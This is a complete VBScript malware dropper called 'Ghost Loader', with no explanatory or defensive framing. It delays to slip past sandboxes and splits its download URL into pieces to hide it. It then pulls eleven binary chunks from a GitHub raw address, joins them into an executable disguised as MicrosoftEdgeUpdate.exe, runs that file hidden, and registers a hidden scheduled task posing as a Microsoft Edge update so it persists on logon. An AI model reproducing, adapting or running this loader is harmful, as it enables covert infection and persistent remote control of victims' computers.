' Ghost Loader v10.0 (Pure VBS - Max Evasion)
' Techniques: No CMD, No PowerShell, COM-Only, String Obfuscation
Option Explicit
On Error Resume Next

' Anti-Sandbox Check (Skip if running too fast)
Dim startTime : startTime = Timer
WScript.Sleep 3000
If Timer - startTime < 2 Then WScript.Quit

Dim objShell, objFSO, objStream
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Obfuscated Config
Dim r1, r2, r3, destDir, exeName
r1 = "https://raw" : r2 = ".githubusercontent" : r3 = ".com/sophieduval/der/main"
destDir = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\EdgeUpdate"
exeName = "MicrosoftEdgeUpdate.exe"

' 1. Create Hidden Directory
If Not objFSO.FolderExists(destDir) Then
    objFSO.CreateFolder destDir
End If
If Err.Number <> 0 Then Err.Clear

' 2. Download & Assemble (Pure COM - No PowerShell)
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1
objStream.Open

Dim i, padded, url, objHTTP, finalPath
finalPath = destDir & "\" & exeName

For i = 0 To 10
    If i < 10 Then padded = "0" & i Else padded = CStr(i)
    url = r1 & r2 & r3 & "/blob_" & padded & ".dat"
    
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.SetTimeouts 30000, 30000, 30000, 30000
    objHTTP.Open "GET", url, False
    objHTTP.Send
    
    If objHTTP.Status = 200 Then
        objStream.Write objHTTP.ResponseBody
    End If
    Set objHTTP = Nothing
Next

' 3. Save & Execute
objStream.SaveToFile finalPath, 2
objStream.Close
Set objStream = Nothing

If objFSO.FileExists(finalPath) Then
    objShell.Run """" & finalPath & """", 0, False
End If

' 4. Stealth Persistence (COM Task Scheduler - No schtasks.exe)
Dim taskService, rootFolder, taskDef, regInfo, settings, triggers, trigger, actions, execAction
Set taskService = CreateObject("Schedule.Service")
taskService.Connect

Set rootFolder = taskService.GetFolder("\")
Set taskDef = taskService.NewTask(0)

Set regInfo = taskDef.RegistrationInfo
regInfo.Description = "Microsoft Edge Update Service"
regInfo.Author = "Microsoft Corporation"

Set settings = taskDef.Settings
settings.Enabled = True
settings.StartWhenAvailable = True
settings.Hidden = True
settings.DisallowStartIfOnBatteries = False
settings.StopIfGoingOnBatteries = False

Set triggers = taskDef.Triggers
Set trigger = triggers.Create(9)
trigger.Id = "EdgeUpdateTrigger"
trigger.Enabled = True

Set actions = taskDef.Actions
Set execAction = actions.Create(0)
execAction.Path = finalPath

On Error Resume Next
rootFolder.RegisterTaskDefinition "MicrosoftEdgeUpdateService", taskDef, 6, Nothing, Nothing, 3
Err.Clear

' Cleanup
Set taskService = Nothing
Set objShell = Nothing
Set objFSO = Nothing
